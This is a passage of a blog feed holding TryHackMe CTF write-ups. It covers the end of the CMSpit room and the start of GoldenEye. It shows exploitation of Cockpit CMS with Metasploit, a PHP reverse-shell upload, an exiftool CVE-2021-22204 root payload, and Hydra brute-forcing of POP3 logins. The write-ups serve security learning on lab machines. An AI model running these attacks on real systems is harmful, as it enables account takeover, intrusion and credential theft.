   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran the module and was able to find 4 users, however the module then failed as a user was required.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; run

[*] Started reverse TCP handler on &amp;lt;Local Machine&amp;gt;:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: [&quot;admin&quot;, &quot;darkStar7471&quot;, &quot;skidy&quot;, &quot;ekoparty&quot;]
[-] Exploit aborted due to failure: bad-config: cmspit.thm:80 - User to exploit required
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I set user to admin and ran the module again.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; set user admin
user =&amp;gt; admin
msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; run

[*] Started reverse TCP handler on &amp;lt;Local Machine&amp;gt;:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: [&quot;admin&quot;, &quot;darkStar7471&quot;, &quot;skidy&quot;, &quot;ekoparty&quot;]
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: [&quot;rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23&quot;]
[*] Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*] Obtaining user info
[*]   user: admin
[*]   name: Admin
[*]   email: admin@yourdomain.de
[*]   active: true
[*]   group: admin
[*]   password: &amp;lt;REDACTED&amp;gt;
[*]   i18n: en
[*]   _created: 1621655201
[*]   _modified: 1621655201
[*]   _id: 60a87ea165343539ee000300
[*]   _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*]   md5email: a11eea8bf873a483db461bb169beccec
[+] Changing password to &amp;lt;REDACTED&amp;gt;
[+] Password update successful
[*] Attempting login
[-] Exploit failed: ArgumentError wrong number of arguments (given 3, expected 1..2)
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The exploit failed again however it was able to change the admin password. I went back to the login page and was able to log in as admin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;In the blog post, RCE was possible by uploading a PHP script via the finder directory so I went to cmspit.thm/finder&lt;/p&gt;

&lt;p&gt;I copied a PHP reverse shell script to my directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $mv php-reverse-shell.php shell.php
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I updated the script with my tun0 IP and port of 4444 and started a nc listener with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;. On the webpage I clicked the upload button and selected my shell.php file.&lt;/p&gt;

&lt;p&gt;Now going to ‘http://cmspit.thm/shell.php’ I get a shell!&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Now I have a shell as www-data I want to escalate my privileges. I enumerated the machine and noticed Mongodb was listening on TCP port 27017.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer                  
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      off (0.00/0/0)         
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)              
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)         
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)               
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I connected to the mongodb service and was able to find the credentials for the user ‘stux’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ mongo 127.0.0.1:27017
MongoDB shell version: 2.6.10
connecting to: 127.0.0.1:27017/test
show dbs
admin         (empty)
local         0.078GB
sudousersbak  0.078GB
use sudousersbak
show collections
switched to db sudousersbak
flag
system.indexes
user
db.user.find()
{ &quot;_id&quot; : ObjectId(&quot;60a89d0caadffb0ea68915f9&quot;), &quot;name&quot; : &quot;&amp;lt;REDACTED&amp;gt;&quot; }
{ &quot;_id&quot; : ObjectId(&quot;60a89dfbaadffb0ea68915fa&quot;), &quot;name&quot; : &quot;stux&quot; }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used the credentials to SSH to the machine and ran the command ‘sudo -l’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh stux@cmspit.thm
stux@cmspit.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat May 22 19:41:38 2021 from 192.168.85.1
stux@ubuntu:~$ sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
stux@ubuntu:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The user stux can run the command /usr/local/bin/exiftool as root with out the root password. Normally, I would now go to GTFObins to look for a priv esc, however the room questions indicate a CVE vulnerability so I googled ‘exiftools CVE’ and found this &lt;a href=&quot;https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/&quot;&gt;blog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In the blog it details the steps of how to exploit the vulnerability which is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$ sudo apt install djvulibre-bin&lt;/p&gt;

  &lt;p&gt;$ bzz payload payload.bzz&lt;/p&gt;

  &lt;p&gt;$ djvumake exploit.djvu INFO=’1,1’ BGjp=/dev/null ANTz=payload.bzz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Back on my local machine, I created a payload file with the following contents &lt;code class=&quot;highlighter-rouge&quot;&gt;(metadata &quot;\c${system('/bin/bash')};&quot;)&lt;/code&gt;, then followed the steps above.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $cat payload
(metadata &quot;\c${system('/bin/bash')};&quot;)
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $sudo apt install djvulibre-bin
Reading package lists... Done
Building dependency tree       
Reading state information... Done
djvulibre-bin is already the newest version (3.5.28-2).
The following packages were automatically installed and are no longer required:
  gdal-data libaec0 libarmadillo9 libarpack2 libboost-locale1.67.0 libcfitsio8 libcharls2 libdap25 libdapclient6v5 libepsilon1 libfreexl1 libfyba0 libgdal26 libgeos-3.8.1
  libgeos-c1v5 libgeotiff5 libgfapi0 libgfrpc0 libgfxdr0 libglusterfs0 libhdf4-0-alt libhdf5-103 libkmlbase1 libkmldom1 libkmlengine1 libnetcdf15 libogdi4.1 liborcus-0.15-0
  liborcus-parser-0.15-0 libproj19 libpython3.7-minimal libpython3.7-stdlib libpython3.8-dev libqhull7 libspatialite7 libsuperlu5 libsz2 liburiparser1 libxerces-c3.2 odbcinst
  odbcinst1debian2 proj-bin proj-data python3-gridfs python3.7 python3.7-minimal python3.8-dev
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 2541 not upgraded.
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $bzz payload payload.bzz
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $ls -la exploit.djvu 
-rw-r--r-- 1 daz daz 92 Aug  8 12:13 exploit.djvu
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finaly I started a Python webserver with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo python3 -m http.server 80&lt;/code&gt;. Next back on cmspit machine I downloaded the exploit.djvu file with wget and ran the exif tool as sudo against the exploit file and got root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;stux@ubuntu:~$ wget http://&amp;lt;Local Machine&amp;gt;/exploit.djvu
--2021-08-08 04:16:42--  http://&amp;lt;Local Machine&amp;gt;/exploit.djvu
Connecting to &amp;lt;Local Machine&amp;gt;:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 92 [image/vnd.djvu]
Saving to: ‘exploit.djvu’

exploit.djvu                                 100%[===========================================================================================&amp;gt;]      92  --.-KB/s    in 0s

2021-08-08 04:16:42 (17.8 MB/s) - ‘exploit.djvu’ saved [92/92]

stux@ubuntu:~$ sudo /usr/local/bin/exiftool exploit.djvu 
root@ubuntu:~# whoami
root
root@ubuntu:~# hostname
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">GoldenEye Write Up</title>
      <link href="https://darrynbrownfield.co.uk/goldeneye" rel="alternate" type="text/html" title="GoldenEye Write Up" />
      <published>2021-06-27T00:00:00+00:00</published>
      <updated>2021-06-27T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/goldeneye</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/goldeneye">&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/goldeneye&quot;&gt;goldeneye&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. The machine was pretty easy, it just needed good enumeration.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:39 BST
Nmap scan report for 10.10.50.94
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.44 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;25 - smtp - Postfix smtpd&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache httpd 2.4.7&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I ran a full port scan and found 2 more ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/allports 10.10.50.94
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:40 BST
Nmap scan report for 10.10.50.94
Host is up (0.034s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then completed a targeted scan against the 4 ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p 25,80,55006,55007 -sC -sV -oA nmap/targeted 10.10.50.94
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:54 BST
Nmap scan report for 10.10.50.94
Host is up (0.030s latency).

PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL USER RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA STLS PIPELINING TOP
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.38 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;I started by looking at the HTTP port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webpage tells us to go to /sev-home/ however the page is password protected and currently I have no usernames or password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/loginprompt.png&quot; alt=&quot;loginprompt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I checked the source code for the webpage.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;GoldenEye Primary Admin Server&amp;lt;/title&amp;gt;
&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;index.css&quot;&amp;gt;
&amp;lt;/head&amp;gt;

	&amp;lt;span id=&quot;GoldenEyeText&quot; class=&quot;typeing&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;span class='blinker'&amp;gt;&amp;amp;#32;&amp;lt;/span&amp;gt;

&amp;lt;script src=&quot;terminal.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
	
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not a great deal in there but there is a javascript file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;var data = [
  {
    GoldenEyeText: &quot;&amp;lt;span&amp;gt;&amp;lt;br/&amp;gt;Severnaya Auxiliary Control Station&amp;lt;br/&amp;gt;****TOP SECRET ACCESS****&amp;lt;br/&amp;gt;Accessing Server Identity&amp;lt;br/&amp;gt;Server Name:....................&amp;lt;br/&amp;gt;GOLDENEYE&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;User: UNKNOWN&amp;lt;br/&amp;gt;&amp;lt;span&amp;gt;Naviagate to /sev-home/ to login&amp;lt;/span&amp;gt;&quot;
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&amp;amp;#73;&amp;amp;#110;&amp;amp;#118;&amp;amp;#105;&amp;amp;#110;&amp;amp;#99;&amp;amp;#105;&amp;amp;#98;&amp;amp;#108;&amp;amp;#101;&amp;amp;#72;&amp;amp;#97;&amp;amp;#99;&amp;amp;#107;&amp;amp;#51;&amp;amp;#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName(&quot;typeing&quot;);
for (var j = 0; j &amp;lt; allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `&amp;lt;span class='blinker'&amp;gt;&amp;amp;#32;&amp;lt;/span&amp;gt;`;
    var char = text.slice(-1);
    if (char === &quot;&amp;lt;&quot;) isTag = true;
    if (char === &quot;&amp;gt;&quot;) isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Few things to note in here, we have 2 names (boris, natalya) and an encoded password. I went to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;Cyber Chef&lt;/a&gt; to decode the password. Using the magic function the string is decoded from HTLM Entity to clear text.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/cyberchefjscode.png&quot; alt=&quot;cyberchefjscode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the the username ‘boris’ and password from cyberchef I can now login to the webpage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/loggedinwebpage.png&quot; alt=&quot;loggedinwebpage&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)&lt;/p&gt;

  &lt;p&gt;Please email a qualified GNO supervisor to receive the online &lt;strong&gt;GoldenEye Operators Training&lt;/strong&gt; to become an Administrator of the GoldenEye system&lt;/p&gt;

  &lt;p&gt;Remember, since &lt;strong&gt;&lt;em&gt;security by obscurity&lt;/em&gt;&lt;/strong&gt; is very effective, we have configured our pop3 service to run on a very high non-default port&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Its now time to turn attention to the smtp/pop3 ports.&lt;/p&gt;

&lt;h3 id=&quot;email-enumeration&quot;&gt;Email Enumeration&lt;/h3&gt;

&lt;p&gt;Reviewing the nmap output, port 25 SMTP allows the VRFY command however not AUTH. Port 55007 POP3 does allow authentication, I tried to login using the credentials found for boris but they didnt work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/pop3boris.png&quot; alt=&quot;pop3boris&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using Hydra I was able to brute force boris’s password.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Normaly I would use rockyou.txt however after around 30 minutes I had no hits so swapped to the much smaller wordlist fasttrack and got a hit after a minute or so.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l boris -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:00:47
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.50.94:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.50.94   login: boris   password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:03:34
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I repeated the process for natalya.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:05:44
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.50.94:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.50.94   login: natalya   password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:07:45
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I had some credentials it was time to login and check for any email messages, to do this I used netcat to connect to the POP3 service and authentication and use the ‘LIST’ and ‘RETR’ commands to list and retrieve messages.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A list of POP3 commands can be found &lt;a href=&quot;https://www.shellhacks.com/retrieve-email-pop3-server-command-line/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
+OK Logged in.
list
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: &amp;lt;root@127.0.0.1.goldeneye&amp;gt;
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for &amp;lt;boris&amp;gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: &amp;lt;20180425022326.D9E47454B1@ubuntu&amp;gt;
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the ot
her admins here.
.
RETR 2
+OK 373 octets
Return-Path: &amp;lt;natalya@ubuntu&amp;gt;
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for &amp;lt;boris&amp;gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: &amp;lt;20180425024249.C3F2B454B1@ubuntu&amp;gt;
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: &amp;lt;alec@janus.boss&amp;gt;
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for &amp;lt;boris&amp;gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: &amp;lt;20180425025235.4B9F4454B1@ubuntu&amp;gt;
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this s
erver then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and capture
d our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I repeated the same process for natalya.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 1
+OK 631 octets
Return-Path: &amp;lt;root@ubuntu&amp;gt;
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for &amp;lt;natalya&amp;gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: &amp;lt;20180425024542.D5EDA454B1@ubuntu&amp;gt;
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: &amp;lt;root@ubuntu&amp;gt;
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for &amp;lt;natalya&amp;gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: &amp;lt;20180425031956.17C96454B1@ubuntu&amp;gt;
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even
 if it's not, just enter it in under the guise of &quot;security&quot;...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great more credentials and a new HTTP endpoint. I added the details to my /etc/hosts file and navigated to http://severnaya-station.com/gnocertdir/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/moodle.png&quot; alt=&quot;moodle&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Logging in as xenia a message notification popped up, using the notification I was navigated to the users messages.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/goldeneye/xeniamessage.png&quot; alt=&quot;xeniamessage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A new email username is ‘doak’&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:16:54
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.50.94:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.50.94   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:19:23
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Repeating the same process as before, I brute forced the users password and logged in to POP3 service to check for messages.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc 10.10.50.94 55007
+OK GoldenEye POP3 Electronic-Mail System
user doak
+OK
pass &amp;lt;&amp;lt;redacted&amp;gt;&amp;gt;
+OK Logged in.
list
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: &amp;lt;doak@ubuntu&amp;gt;
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
